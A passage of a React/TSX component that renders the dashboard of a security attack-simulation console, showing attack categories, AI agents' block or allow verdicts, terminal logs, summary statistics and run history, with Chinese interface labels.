                                            onClick={() => toggleCategory(category.id)}
                                            className={`flex w-full items-center justify-between gap-3 px-4 py-3 text-left transition-colors hover:bg-muted/30 ${category.bgColor}`}
                                        >
                                            <div className="flex min-w-0 items-center gap-3">
                                                <div className={`flex h-8 w-8 items-center justify-center rounded-lg border ${category.borderColor} ${category.bgColor}`}>
                                                    <Icon className={`h-4 w-4 ${category.color}`} />
                                                </div>
                                                <div className="min-w-0">
                                                    <div className={`truncate text-sm font-semibold ${category.color}`}>{category.name}</div>
                                                    <div className="text-xs text-muted-foreground">{categoryAttacks.length} 项攻击</div>
                                                </div>
                                            </div>
                                            <div className="flex items-center gap-2">
                                                {selectedInCategory > 0 && (
                                                    <span className="rounded-full border border-border bg-card px-2 py-0.5 text-[10px] font-semibold text-foreground">
                                                        {selectedInCategory}
                                                    </span>
                                                )}
                                                {isExpanded ? <ChevronDown className="h-4 w-4 text-muted-foreground" /> : <ChevronRight className="h-4 w-4 text-muted-foreground" />}
                                            </div>
                                        </button>
                                        <AnimatePresence initial={false}>
                                            {isExpanded && (
                                                <motion.div
                                                    initial={{ height: 0, opacity: 0 }}
                                                    animate={{ height: 'auto', opacity: 1 }}
                                                    exit={{ height: 0, opacity: 0 }}
                                                    transition={{ duration: 0.2 }}
                                                    className="overflow-hidden border-t border-border bg-muted/15"
                                                >
                                                    <div className="space-y-2 p-3">
                                                        {categoryAttacks.map((attack) => {
                                                            const isSelected = selectedAttacks.includes(attack.id);
                                                            const severityStyle = getSeverityStyle(attack.severity);

                                                            return (
                                                                <button
                                                                    key={attack.id}
                                                                    onClick={() => toggleAttack(attack.id)}
                                                                    className={`w-full rounded-xl border p-3 text-left transition-colors ${
                                                                        isSelected
                                                                            ? `${severityStyle.bg} ${severityStyle.border}`
                                                                            : 'border-border bg-card hover:bg-muted/20'
                                                                    }`}
                                                                >
                                                                    <div className="flex items-start justify-between gap-3">
                                                                        <div className="min-w-0">
                                                                            <p className="truncate text-sm font-medium text-foreground">{attack.name}</p>
                                                                            <p className="mt-1 truncate font-mono text-[11px] text-muted-foreground">{attack.description}</p>
                                                                        </div>
                                                                        <span className={`rounded-full border px-2 py-0.5 text-[10px] font-semibold uppercase ${severityStyle.bg} ${severityStyle.border} ${severityStyle.text}`}>
                                                                            {getSeverityName(attack.severity)}
                                                                        </span>
                                                                    </div>
                                                                </button>
                                                            );
                                                        })}
                                                    </div>
                                                </motion.div>
                                            )}
                                        </AnimatePresence>
                                    </div>
                                );
                            })}
                        </div>
                    </ConsolePanel>
                </motion.div>

                <motion.div variants={itemVariants} className="space-y-6 lg:col-span-8 xl:col-span-9">
                    <ConsolePanel
                        title={t('attackSimulator.liveAttackAnalysis')}
                        subtitle={attackProgress.length > 0 ? `${attackProgress.filter((item) => item.status === 'complete').length}/${attackProgress.length} ${t('attackSimulator.completed')}` : undefined}
                        icon={Users}
                        iconTone="primary"
                    >
                        <div className="max-h-[440px] space-y-3 overflow-y-auto pr-1">
                            {attackProgress.length > 0 ? (
                                attackProgress.map((progress, index) => {
                                    const isBlocked = progress.result?.blocked;
                                    const statusClasses =
                                        progress.status === 'complete'
                                            ? isBlocked
                                                ? 'border-emerald-500/20 bg-emerald-500/10'
                                                : 'border-rose-500/20 bg-rose-500/10'
                                            : progress.status === 'analyzing'
                                              ? 'border-amber-500/20 bg-amber-500/10'
                                              : 'border-border bg-muted/10';

                                    return (
                                        <motion.div
                                            key={progress.attackId}
                                            initial={{ opacity: 0, y: 10 }}
                                            animate={{ opacity: 1, y: 0 }}
                                            transition={{ delay: index * 0.05 }}
                                            className={`rounded-xl border p-4 ${statusClasses}`}
                                        >
                                            <div className="flex items-start gap-4">
                                                <div
                                                    className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-xl ${
                                                        progress.status === 'complete'
                                                            ? isBlocked
                                                                ? 'bg-emerald-500/15 text-emerald-600 dark:text-emerald-400'
                                                                : 'bg-rose-500/15 text-rose-600 dark:text-rose-400'
                                                            : progress.status === 'analyzing'
                                                              ? 'bg-amber-500/15 text-amber-600 dark:text-amber-400'
                                                              : 'bg-muted text-muted-foreground'
                                                    }`}
                                                >
                                                    {progress.status === 'complete' ? (
                                                        isBlocked ? <CheckCircle className="h-5 w-5" /> : <XCircle className="h-5 w-5" />
                                                    ) : progress.status === 'analyzing' ? (
                                                        <RefreshCw className="h-5 w-5 animate-spin" />
                                                    ) : (
                                                        <Clock className="h-5 w-5" />
                                                    )}
                                                </div>
                                                <div className="min-w-0 flex-1">
                                                    <div className="flex flex-col gap-2 sm:flex-row sm:items-start sm:justify-between">
                                                        <div className="min-w-0">
                                                            <p className="truncate text-sm font-semibold text-foreground">{progress.attackName}</p>
                                                            <p className="text-xs text-muted-foreground">{getCategoryName(progress.category)}</p>
                                                        </div>
                                                        <div className="text-left sm:text-right">
                                                            {progress.status === 'complete' && progress.result && (
                                                                <>
                                                                    <p className={`text-sm font-semibold ${isBlocked ? 'text-emerald-600 dark:text-emerald-400' : 'text-rose-600 dark:text-rose-400'}`}>
                                                                        {isBlocked ? t('attackSimulator.blocked') : t('attackSimulator.allowed')}
                                                                    </p>
                                                                    <p className="text-xs text-muted-foreground">{progress.result.responseTime}ms</p>
                                                                    {progress.result.aiAnalysis?.usedAI && (
                                                                        <p className="text-[11px] text-muted-foreground">
                                                                            AI {progress.result.aiAnalysis.route || 'unknown'} via {progress.result.aiAnalysis.provider || progress.result.aiAnalysis.engine || 'model-router'}
                                                                        </p>
                                                                    )}
                                                                </>
                                                            )}
                                                            {progress.status === 'analyzing' && <p className="text-sm font-medium text-amber-600 dark:text-amber-400">{t('attackSimulator.analyzing')}</p>}
                                                            {progress.status === 'pending' && <p className="text-sm text-muted-foreground">{t('attackSimulator.pending')}</p>}
                                                        </div>
                                                    </div>

                                                    {progress.analyses.length > 0 && (
                                                        <div className="mt-3 space-y-2">
                                                            {progress.analyses.map((analysis, analysisIndex) => {
                                                                const agentStyle = getAgentStyle(analysis.agent);
                                                                return (
                                                                    <motion.div
                                                                        key={`${progress.attackId}-${analysisIndex}`}
                                                                        initial={{ opacity: 0, x: -10 }}
                                                                        animate={{ opacity: 1, x: 0 }}
                                                                        transition={{ delay: analysisIndex * 0.05 }}
                                                                        className={`rounded-lg border px-3 py-2 ${agentStyle.bg} ${agentStyle.border}`}
                                                                    >
                                                                        <div className="flex items-start gap-3">
                                                                            <div className={`flex h-6 w-6 shrink-0 items-center justify-center rounded-full ${agentStyle.bg}`}>
                                                                                <Bot className={`h-3.5 w-3.5 ${agentStyle.color}`} />
                                                                            </div>
                                                                            <div className="min-w-0 flex-1">
                                                                                <div className={`text-xs font-semibold ${agentStyle.color}`}>{agentStyle.name}</div>
                                                                                <p className="mt-1 text-xs leading-5 text-foreground">{analysis.message}</p>
                                                                                {analysis.verdict && (
                                                                                    <div className="mt-2 rounded-md border border-border bg-card/80 px-2.5 py-2 text-xs">
                                                                                        <span className="font-medium text-foreground">{t('attackSimulator.decision')}: </span>
                                                                                        <span className={analysis.verdict === 'block' ? 'text-rose-600 dark:text-rose-400' : 'text-emerald-600 dark:text-emerald-400'}>
                                                                                            {analysis.verdict === 'block' ? t('attackSimulator.blocked') : t('attackSimulator.allowed')}
                                                                                        </span>
                                                                                        {analysis.confidence && <span className="text-muted-foreground"> ({(analysis.confidence * 100).toFixed(0)}%)</span>}
                                                                                    </div>
                                                                                )}
                                                                            </div>
                                                                        </div>
                                                                    </motion.div>
                                                                );
                                                            })}
                                                        </div>
                                                    )}
                                                </div>
                                            </div>
                                        </motion.div>
                                    );
                                })
                            ) : (
                                <ConsoleEmptyState title={t('attackSimulator.selectAndRun')} description="选中攻击并执行后，这里会显示分析过程与判定结果。" />
                            )}
                        </div>
                    </ConsolePanel>

                    <ConsolePanel title={t('attackSimulator.terminal')} subtitle="执行日志流" icon={Terminal} iconTone="neutral">
                        <div className="rounded-xl border border-border bg-muted/20">
                            <div className="border-b border-border px-4 py-3 text-xs text-muted-foreground">终端输出</div>
                            <div ref={terminalRef} className="h-52 overflow-y-auto bg-background/80 px-4 py-4 font-mono text-sm">
                                {terminalLogs.length > 0 ? (
                                    <div className="space-y-2">
                                        {terminalLogs.map((log, index) => (
                                            <motion.div key={`${log}-${index}`} initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="leading-relaxed text-foreground">
                                                <span className="text-emerald-600 dark:text-emerald-400">$</span> {log}
                                            </motion.div>
                                        ))}
                                    </div>
                                ) : (
                                    <div className="flex items-center gap-2 text-muted-foreground">
                                        <span className="text-emerald-600 dark:text-emerald-400">$</span>
                                        {t('attackSimulator.waitingSimulation')}
                                    </div>
                                )}
                            </div>
                        </div>
                    </ConsolePanel>
                </motion.div>
            </div>

            <AnimatePresence>
                {report && (
                    <motion.div
                        initial={{ opacity: 0, y: 20 }}
                        animate={{ opacity: 1, y: 0 }}
                        exit={{ opacity: 0, y: -20 }}
                        className="grid grid-cols-1 gap-6 lg:grid-cols-12"
                    >
                        <div className="lg:col-span-4">
                            <ConsolePanel title={t('attackSimulator.results')} subtitle="最近一次演练汇总" icon={BarChart3} iconTone="primary">
                                <div className="grid grid-cols-3 gap-3">
                                    <div className="rounded-xl border border-border bg-muted/20 p-4 text-center">
                                        <p className="text-3xl font-bold tracking-tight text-foreground">{report.total}</p>
                                        <p className="mt-1 text-xs text-muted-foreground">{t('attackSimulator.total')}</p>
                                    </div>
                                    <div className="rounded-xl border border-emerald-500/20 bg-emerald-500/10 p-4 text-center">
                                        <p className="text-3xl font-bold tracking-tight text-emerald-600 dark:text-emerald-400">{report.blocked}</p>
                                        <p className="mt-1 text-xs text-emerald-600/80 dark:text-emerald-400/80">{t('attackSimulator.blocked')}</p>
                                    </div>
                                    <div className="rounded-xl border border-rose-500/20 bg-rose-500/10 p-4 text-center">
                                        <p className="text-3xl font-bold tracking-tight text-rose-600 dark:text-rose-400">{report.allowed}</p>
                                        <p className="mt-1 text-xs text-rose-600/80 dark:text-rose-400/80">{t('attackSimulator.allowed')}</p>
                                    </div>
                                </div>

                                <div className="mt-6 space-y-3">
                                    <div className="flex items-center justify-between text-sm">
                                        <span className="text-muted-foreground">{t('attackSimulator.blockRate')}</span>
                                        <span className="font-medium text-foreground">{getBlockRate()}%</span>
                                    </div>
                                    <div className="h-2 overflow-hidden rounded-full bg-muted">
                                        <motion.div
                                            initial={{ width: 0 }}
                                            animate={{ width: `${getBlockRate()}%` }}
                                            transition={{ duration: 0.5 }}
                                            className="h-full rounded-full bg-emerald-500"
                                        />
                                    </div>
                                    {report.aiAnalysis && (
                                        <div className="rounded-xl border border-border bg-background/70 p-3 text-xs text-muted-foreground space-y-1">
                                            <div className="flex items-center justify-between">
                                                <span>AI-backed decisions</span>
                                                <span className="font-medium text-foreground">{report.aiAnalysis.aiBackedCount}/{report.total}</span>
                                            </div>
                                            <div className="flex items-center justify-between">
                                                <span>Cloud routes</span>
                                                <span className="font-medium text-foreground">{report.aiAnalysis.cloudCount}</span>
                                            </div>
                                            <div className="flex items-center justify-between">
                                                <span>Local routes</span>
                                                <span className="font-medium text-foreground">{report.aiAnalysis.localCount}</span>
                                            </div>
                                            {report.aiAnalysis.errorCount > 0 && (
                                                <div className="flex items-center justify-between text-rose-600 dark:text-rose-400">
                                                    <span>AI route errors</span>
                                                    <span className="font-medium">{report.aiAnalysis.errorCount}</span>
                                                </div>
                                            )}
                                        </div>
                                    )}
                                </div>
                            </ConsolePanel>
                        </div>

                        <div className="lg:col-span-8">
                            <ConsolePanel title={t('attackSimulator.attackResults')} subtitle="逐项攻击判定日志" icon={AlertTriangle} iconTone="warning">
                                <div className="max-h-72 space-y-2 overflow-y-auto pr-1">
                                    {report.results.map((result, i) => (
                                        <motion.div
                                            key={i}
                                            initial={{ opacity: 0, x: -20 }}
                                            animate={{ opacity: 1, x: 0 }}
                                            transition={{ delay: i * 0.05 }}
                                            className={`flex items-center justify-between rounded-xl border p-3 ${
                                                result.blocked
                                                    ? 'border-emerald-500/20 bg-emerald-500/10'
                                                    : 'border-rose-500/20 bg-rose-500/10'
                                            }`}
                                        >
                                            <div className="flex min-w-0 items-center gap-3">
                                                <div className={`flex h-8 w-8 shrink-0 items-center justify-center rounded-lg ${
                                                    result.blocked
                                                        ? 'bg-emerald-500/15 text-emerald-600 dark:text-emerald-400'
                                                        : 'bg-rose-500/15 text-rose-600 dark:text-rose-400'
                                                }`}>
                                                    {result.blocked ? <CheckCircle className="h-4 w-4" /> : <XCircle className="h-4 w-4" />}
                                                </div>
                                                <div className="min-w-0">
                                                    <p className="truncate text-sm font-medium text-foreground">{result.attackName}</p>
                                                    <p className="text-xs text-muted-foreground">{getCategoryName(result.category)}</p>
                                                    {result.aiAnalysis?.usedAI && (
                                                        <p className="text-[11px] text-muted-foreground">
                                                            AI {result.aiAnalysis.route || 'unknown'} via {result.aiAnalysis.provider || result.aiAnalysis.engine || 'model-router'}
                                                        </p>
                                                    )}
                                                </div>
                                            </div>
                                            <div className="text-right">
                                                <p className={`text-sm font-semibold ${result.blocked ? 'text-emerald-600 dark:text-emerald-400' : 'text-rose-600 dark:text-rose-400'}`}>
                                                    {result.blocked ? t('attackSimulator.blocked') : t('attackSimulator.allowed')}
                                                </p>
                                                <p className="text-xs text-muted-foreground">{result.responseTime}ms</p>
                                            </div>
                                        </motion.div>
                                    ))}
                                </div>
                            </ConsolePanel>
                        </div>
                    </motion.div>
                )}
            </AnimatePresence>

            {history.length > 0 && (
                <motion.div variants={itemVariants}>
                    <ConsolePanel title={t('attackSimulator.recentSimulations')} subtitle="最近完成的演练批次" icon={Clock} iconTone="neutral">
                        <div className="grid grid-cols-1 gap-3 md:grid-cols-2 xl:grid-cols-3">
                            {history.slice(0, 6).map((item, i) => (
                                <motion.div
                                    key={item.id || i}
                                    initial={{ opacity: 0, scale: 0.95 }}
                                    animate={{ opacity: 1, scale: 1 }}
                                    transition={{ delay: i * 0.05 }}
                                    className="rounded-xl border border-border bg-muted/15 p-4"
                                >
                                    <p className="text-xs text-muted-foreground">{new Date(item.startTime).toLocaleString()}</p>
                                    <div className="mt-3 flex flex-wrap items-center gap-3 text-sm">
                                        <span className="font-medium text-foreground">
                                            {item.total} {t('attackSimulator.attacks')}
                                        </span>
                                        <span className="text-emerald-600 dark:text-emerald-400">
                                            {item.blocked} {t('attackSimulator.blocked')}
                                        </span>
                                        <span className="text-rose-600 dark:text-rose-400">
                                            {item.allowed} {t('attackSimulator.allowed')}
                                        </span>
                                    </div>
                                    <div className="mt-3 flex justify-end">
                                        <Link to={`/attack-sim/runs/${getAttackRunRouteId(item)}`} className="rounded-lg border border-border bg-card px-3 py-1.5 text-xs font-medium text-foreground hover:bg-muted/30">
                                            查看详情
                                        </Link>
                                    </div>
                                </motion.div>
                            ))}
                        </div>
                    </ConsolePanel>
                </motion.div>
            )}
        </motion.div>
    );
}
